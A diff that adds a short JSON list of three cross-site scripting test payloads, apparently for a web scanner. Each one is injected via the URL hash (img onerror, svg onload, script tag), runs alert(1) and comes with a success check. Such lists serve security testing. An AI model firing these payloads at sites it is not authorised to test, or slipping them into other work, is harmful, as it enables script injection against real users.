@@ -1,0 +1,35 @@
+[
+  {
+    "payload_id": "OWP-0286",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "hash_parameter",
+    "payload_string": "#<img src=x onerror=alert(1)>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "alert"
+    }
+  },
+  {
+    "payload_id": "OWP-0287",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "hash_parameter",
+    "payload_string": "#<svg onload=alert(1)>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "alert"
+    }
+  },
+  {
+    "payload_id": "OWP-0288",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "hash_parameter",
+    "payload_string": "#<script>alert(1)</script>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "alert"
+    }
+  }
+]
